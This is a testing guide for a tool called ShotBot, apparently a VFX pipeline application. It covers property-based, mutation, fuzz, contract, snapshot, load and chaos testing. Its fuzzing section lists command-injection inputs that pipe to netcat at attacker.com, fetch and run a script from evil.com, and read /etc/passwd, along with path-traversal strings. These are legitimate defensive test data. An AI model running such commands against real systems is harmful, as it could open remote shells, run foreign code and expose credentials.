# Advanced Testing Techniques for ShotBot

This guide describes advanced testing techniques implemented to improve test quality, coverage, and system resilience.

## 1. Property-Based Testing (Hypothesis)

**Location**: `tests/advanced/test_property_based.py`

### Purpose
Property-based testing automatically generates test cases to find edge cases that example-based tests might miss.

### Implementation Areas

#### Raw Plate Finder
- **Pattern Matching**: Tests plate patterns with randomly generated shot names, plate names, versions, and color spaces
- **Priority Ordering**: Verifies plate prioritization logic with random priority values
- **Path Sanitization**: Ensures path sanitization is idempotent with random Unix paths

#### 3DE Scene Handling
- **Deduplication Invariants**: Tests that deduplication maintains critical invariants (no duplicates, result size <= input)
- **User Exclusion**: Verifies current user filtering works correctly with random user combinations

#### Cache State Machine
- **Stateful Testing**: Models cache as a state machine to test complex interaction sequences
- **Consistency Checks**: Ensures cache remains consistent through random operation sequences

### Value Added
- Discovers edge cases missed by manual testing
- Validates invariants across large input spaces
- Catches regression in complex algorithms

### Example Usage
```python
@given(
    shot_name=shot_name_strategy(),
    plate_name=plate_name_strategy(),
    version=version_strategy(),
)
def test_plate_pattern_matching(shot_name, plate_name, version):
    # Test with hundreds of automatically generated combinations
    filename = f"{shot_name}_turnover-plate_{plate_name}_aces_{version}.1001.exr"
    assert pattern.match(filename) is not None
```

## 2. Mutation Testing

**Location**: `tests/advanced/test_mutation_testing.py`

### Purpose
Verifies test effectiveness by mutating code and ensuring tests catch the mutations.

### Mutation Operators

#### Boundary Mutations
- Changes `<` to `<=`, `>` to `>=` to test boundary conditions
- Ensures tests verify exact boundary behavior

#### Boolean Mutations
- Inverts boolean operators (AND to OR, NOT removal)
- Validates logical condition testing

#### Return Value Mutations
- Modifies return values (True→False, numbers→0, objects→None)
- Checks error handling paths

#### Exception Mutations
- Removes try-except blocks
- Verifies exception handling coverage

### Implementation Areas
- **Command Validation**: Tests launcher command validation logic
- **Shot Parsing**: Validates shot name parsing robustness
- **Resource Checks**: Ensures resource availability checks are properly tested

### Value Added
- Identifies weak or missing test cases
- Improves test suite quality
- Ensures critical paths are properly covered

### Mutation Score Calculation
```python
mutation_score = killed_mutants / (killed_mutants + survived_mutants)
# Target: >= 0.8 for critical paths
```

## 3. Fuzzing

**Location**: `tests/advanced/test_fuzzing.py`

### Purpose
Discovers security vulnerabilities, input validation issues, and edge cases through random input generation.

### Fuzzing Categories

#### Command Injection
```python
dangerous_commands = [
    "; ls -la",
    "&& cat /etc/passwd",
    "| nc attacker.com 1234",
    "$(curl evil.com/script.sh | sh)",
]
```
- Tests launcher resistance to shell injection
- Validates command sanitization

#### Path Traversal
```python
malicious_paths = [
    "../../../etc/passwd",
    "/proc/self/environ",
    "file\x00.txt",  # Null bytes
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # Encoded
]
```
- Ensures filesystem operations are sandboxed
- Prevents unauthorized file access

#### Unicode Edge Cases
- Homoglyphs: `ѕhοt_001` (Cyrillic/Greek characters)
- Zero-width characters
- Direction markers (RTL/LTR)
- Normalization issues

#### Memory Safety
- Large input handling (1MB+ strings)
- Deeply nested structures
- Recursive structure handling

### Value Added
- Discovers security vulnerabilities before production
- Tests input validation comprehensively
- Ensures robust Unicode handling

## 4. Contract Testing

**Location**: `tests/advanced/test_contract_validation.py`

### Purpose
Validates API boundaries and ensures components respect their contracts.

### Contract Types

#### Interface Contracts
```python
class ShotModelContract(Protocol):
    def refresh_shots(self) -> RefreshResult: ...
    def get_shot_by_index(self, index: int) -> Optional[Shot]: ...
```
- Defines expected component interfaces
- Validates method signatures and return types

#### Signal Contracts
```python
@dataclass
class SignalContract:
    signal_name: str
    signal_type: List[Type]
    slot_constraints: List[Callable]
```
- Ensures Qt signals match expected signatures
- Validates signal-slot connections

### Implementation Areas
- **ShotModel**: Data fetching and caching contracts
- **CacheManager**: Cache operation contracts
- **LauncherManager**: Process management contracts
- **Finder Components**: Discovery contracts

### Value Added
- Prevents interface regression
- Enables safe refactoring
- Documents component expectations

## 5. Snapshot Testing

**Location**: `tests/advanced/test_snapshot.py`

### Purpose
Detects unexpected changes in UI states, configurations, and data structures.

### Snapshot Types

#### UI State Snapshots
- Window geometry and layout
- Widget visibility and enabled states
- Current selections and focus

#### Configuration Snapshots
- QSettings values
- Application preferences
- Custom launcher configurations

#### Data Structure Snapshots
- Shot list structure
- Cache contents
- 3DE scene discovery results

### Implementation
```python
@dataclass
class Snapshot:
    id: str
    timestamp: datetime
    data: Dict[str, Any]
    checksum: str  # SHA256 of data
    
    def diff(self, other: "Snapshot") -> Dict[str, Any]:
        # Returns added, removed, changed keys
```

### Value Added
- Catches unintended UI changes
- Validates configuration persistence
- Ensures data structure compatibility

## 6. Load/Stress Testing

**Location**: `tests/advanced/test_load_stress.py`

### Purpose
Tests system behavior under various load conditions.

### Load Profiles

#### Gradual Load
```python
LoadProfile(
    initial_load=1,
    peak_load=20,
    ramp_up_time=10,
    hold_time=10,
    ramp_down_time=10
)
```
- Simulates normal growth patterns
- Tests scaling behavior

#### Spike Load
```python
LoadProfile(
    spike_probability=0.1,
    spike_multiplier=3.0
)
```
- Simulates sudden traffic spikes
- Tests burst handling

#### Endurance Testing
- Long-running constant load
- Memory leak detection
- Resource exhaustion testing

### Performance Metrics
```python
@dataclass
class PerformanceMetrics:
    response_times: List[float]
    error_rate: float
    throughput: float
    p95_response_time: float
    p99_response_time: float
    memory_usage_mb: float
    cpu_percent: float
```

### Value Added
- Identifies performance bottlenecks
- Detects memory leaks
- Validates scalability

## 7. Chaos Engineering

**Location**: `tests/advanced/test_chaos_engineering.py`

### Purpose
Tests system resilience by injecting failures and adverse conditions.

### Chaos Types

#### Network Chaos
```python
with NetworkChaos.slow_network(delay_ms=2000):
    # Test with 2-second network delays
    
with NetworkChaos.intermittent_network(failure_rate=0.5):
    # 50% of network calls fail
    
with NetworkChaos.packet_loss(loss_rate=0.2):
    # 20% packet loss simulation
```

#### Filesystem Chaos
```python
with FilesystemChaos.readonly_filesystem():
    # Simulate read-only filesystem
    
with FilesystemChaos.full_disk():
    # Simulate disk full errors
    
with FilesystemChaos.slow_io(delay_ms=500):
    # Simulate slow I/O operations
```

#### Memory Chaos
- Memory pressure simulation
- Random garbage collection
- Memory allocation failures

#### Threading Chaos
- Random lock delays
- Thread starvation
- Deadlock conditions

### Recovery Patterns
- Cache recovery after corruption
- Launcher recovery after crash
- Progressive degradation under failures

### Value Added
- Validates error handling
- Tests graceful degradation
- Ensures system resilience

## Implementation Guidelines

### Running Advanced Tests

```bash
# Run all advanced tests
pytest tests/advanced/ -v

# Run specific test types
pytest tests/advanced/test_property_based.py -v
pytest tests/advanced/test_fuzzing.py -v

# Run with specific markers
pytest -m "not stress" # Skip stress tests
RUN_STRESS_TESTS=1 pytest tests/advanced/test_concurrent_stress.py
RUN_LOAD_TESTS=1 pytest tests/advanced/test_load_stress.py

# Run with Hypothesis statistics
pytest tests/advanced/test_property_based.py --hypothesis-show-statistics
```

### CI/CD Integration

```yaml
# .github/workflows/advanced-tests.yml
- name: Property-Based Tests
  run: pytest tests/advanced/test_property_based.py --hypothesis-profile=ci

- name: Mutation Testing
  run: |
    pip install mutmut
    mutmut run --paths-to-mutate=launcher_manager.py
    mutmut results

- name: Security Fuzzing
  run: pytest tests/advanced/test_fuzzing.py --tb=short

- name: Load Testing (nightly)
  if: github.event_name == 'schedule'
  run: RUN_LOAD_TESTS=1 pytest tests/advanced/test_load_stress.py
```

### Best Practices

1. **Isolate Advanced Tests**: Keep them separate from regular unit tests
2. **Use Markers**: Mark tests appropriately (`@pytest.mark.stress`, `@pytest.mark.slow`)
3. **Set Timeouts**: Prevent runaway tests with appropriate timeouts
4. **Monitor Resources**: Track memory and CPU during tests
5. **Reproducibility**: Use fixed seeds for random generation
6. **Gradual Adoption**: Start with critical paths, expand coverage over time

### Metrics and Reporting

Track these metrics for advanced testing:

- **Mutation Score**: Target >80% for critical code
- **Fuzz Coverage**: Number of unique paths discovered
- **Load Test Results**: P95/P99 latencies, error rates
- **Chaos Recovery Time**: Mean time to recovery (MTTR)
- **Property Test Shrinking**: Minimal failing examples found
- **Contract Violations**: Number of interface breaks detected

## Conclusion

These advanced testing techniques provide comprehensive coverage beyond traditional unit tests:

- **Property-based testing** finds edge cases automatically
- **Mutation testing** validates test effectiveness
- **Fuzzing** discovers security vulnerabilities
- **Contract testing** ensures API stability
- **Snapshot testing** catches unintended changes
- **Load testing** validates performance and scalability
- **Chaos engineering** ensures resilience

Together, they create a robust testing strategy that catches bugs early, prevents regressions, and ensures ShotBot remains reliable under all conditions.